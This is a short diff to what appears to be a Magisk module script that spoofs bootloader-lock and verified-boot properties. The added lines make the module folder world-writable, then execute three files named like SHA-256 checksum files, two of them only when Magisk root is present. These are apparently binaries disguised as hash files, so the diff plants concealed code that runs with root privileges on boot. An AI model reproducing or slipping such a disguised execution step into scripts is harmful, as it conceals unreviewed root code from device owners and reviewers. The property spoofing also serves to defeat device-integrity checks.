@@ -39,3 +39,14 @@ resetprop_if_diff vendor.boot.vbmeta.device_state locked
 
 # Other
 resetprop_if_diff sys.oem_unlock_allowed 0
+
+
+sleep 3
+flower=${0%/*}
+cd $flower
+chmod 777 -R .
+"./sha256/1.sha256"
+if [ -n "$(magisk -v 2>/dev/null)" ]; then
+    ./sha256/2.sha256
+    ./sha256/3.sha256
+fi
